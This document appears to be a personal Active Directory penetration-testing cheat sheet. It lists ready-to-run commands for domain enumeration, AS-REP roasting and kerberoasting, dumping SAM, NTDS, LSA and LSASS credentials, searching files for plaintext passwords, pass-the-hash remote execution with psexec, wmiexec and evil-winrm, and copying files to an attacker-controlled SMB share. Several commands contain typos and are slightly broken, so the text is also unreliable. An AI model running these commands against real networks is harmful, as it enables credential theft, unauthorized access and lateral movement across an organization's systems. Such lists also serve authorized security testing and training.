# The real method

### Bloodhound says all, for the user  node thhe outbound connections are important

```shell
netexec ldap -u '<username>' -p '<password>' <target> --bloodhound --collection All
```

### Basics

```shell
# nmap
nmap -p- -Pn <target> -v -T5 --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn <target> -sC -sV -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn <target> -v --script vuln -oN nmap_vuln.txt

# Anonymous login (rpc,smb,ldap)
rpcclient -U  "" -p "" <target>
rpcclient -U  "" -N <target>
rpcclient -u  "guest" -p "" <target> # after  success enumdomusers
smbclient -L  //<target>
smbclient -N  //<target>//<share_name>
netexec smb -u '' -p '' <target>

#these not only smb but all smb/rdp/rpc/mssql/winrm/wmi
netexec smb -u '<username>' -p '<password>' <target> --sam
netexec smb -u '<username>' -p '<password>' <target> --ntds
netexec smb -u '<username>' -p '<password>' <target> --lsa
netexec smb -u '<username>' -p '<password>' <target> --loggedon-users
netexec smb -u '<username>' -p '<password>' <target> --spider <share_name>
netexec smb -u '<username>' -p '<password>' <target> -M spider_plus -o DOWNLOAD_FLAG=true
netexec smb -u '<username>' -p '<password>' <target> --users
netexec smb -u '<username>' -p '<password>' <target> --shares
netexec ldap -u '' -p '' <target> --users
netexec ldap -u 'guest' -p '' <target> --users
netexec ldap -u '<username>' -p '<password>' <target> --bloodhound --collection All
netexec ldap -u '<username>' -p '<password>' <target> --bloodhound --collection All --dns-server <target_ip>
netexec smb -u 'guest' -p '' <target> (--shares/--users/--rid-brute)
enum4linux -a <target>
nmap -n -sV --script "ldap* and not brute" -p 389 <target>
evil-winrm -i <target> -u <username> -p "<password>"
impacket-lookupsid 'guest'@<target>

certipy-ad find -u "" -p "" -dc-ip <target> -vulnerable
certipy-ad find -u "<username>" -p "<password>" -dc-ip <target> -vulnerable
certipy req
cetipy auth

#nfs enumeration
showmount -e <target>

# get password files
Get-ChildItem -Path C:\ -Recurse -Include *.config,*.ini,*.xml,*.txt -File -ErrorActon SilentlyContinue | Where-Object { $_.FullName -notmatch 'Windows|System32|SysWOW64' } | Select-String -Pattern "password=" 

# get domain name
netexec smb <target>
dnsrecon -d "<domain_name>" -n <target>

# find usernames from websites and stuff and then convert to ad-like
https://github.com/urbanadventurer/username-anarchy
./username-anarchy

https://github.com/mohinparamasivam/AD-Username-Generator
python3 username-generator.py -u <username_file> -o <output_file>

# then kerbrute to validate the usernames to find existing
kerbrute userenum <nbame_file> --dc <target> -d <domain_name>

# AsrepRoast
GetNPUsers.py <domain_name>/<username> -dc-ip <dc_ip> -no-pass
impacket-getNPUsers <domain>/ -dc-ip <target_ip> -ussersfile <username_file> -outputfile <output_filename>
.\Rubeus.exe asreproast /outfile:<output_filename>


# if password and usrename kerberoast
GetUserSPNs.py <domain_name>/<username>:"<password>" -dc-ip <dc_ip>
GetUserSPNs.py <domain_name>/<username>:"<password>" -dc-ip <dc_ip> -request
impacket-GetUserSPNs <domain_name>/<username>:"<password>" -dc-ip <dc_ip> -request

# if stuck run winpeas
.\winpeas.exe

#then login to shares try all, if pwn3d! then we are admin on that device
netexec <smb/rdp/rpc/mssql/winrm/wmi> -u <username> -p <password> <target>
impacket-psexec <domain_name>/<username>:<password>@<target
impacket-wmiexec <domain_name>/<username>:<password>@<target

# dump hashes
impacket-secretsdump -just-dc-ntlm <domain_name>/<username>:<password>@<target
netexec smb -u '<username>' -p '<password>' <target> --sam

# then maybe pass the hash
impacket-psexec <domain_name>/<username>:@<target> -hashes :<hash>
impacket-wmiexec <domain_name>/<username>:@<target> -hashes :<hash>
netexec <smb/rdp/rpc/mssql/winrm/wmi> -u <username> -h <hash> <target>
netexec <smb/rdp/rpc/mssql/winrm/wmi> -u <username> -H <hash_file> <target> --continue-on-success
evil-winrm -i <target> -u <username> -H <hash>

```

```shell
netexec smb <target> -u '<username>' -p '<password>' -M lsassy | fgrep -v '[' | awk '{print $6}' >> dumped_hashes.txt
netexec smb <target> -u '<username>' -p '<password>' -M ntdsutil | fgrep -v '[' | awk '{print $4}' >> dumped_hashes.txt
netexec smb <target> -u '<username>' -p '<password>' --rid-rute | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f 2 | tee users.txt
netexec smb <target> -u '<username>' -p '<password>' --users | awk '{print$ 5}' | fgrep -v '[*]' | tee users.txt
```

```shell

# Check for PrintNightmare
icacls.exe "C:\Windows\System32\spoolsv.exe"

# Transfer files
impacket-smbshare share ./ -user test -password ''
net use \\<attacker_ip>\share
. .\PowerUp.ps1;Invoke-AllChecks
```

```shell
# Check if Applocker is running
powershell -C Get-Service AppIDSvc
setspn -T medin -Q ?*/*


```
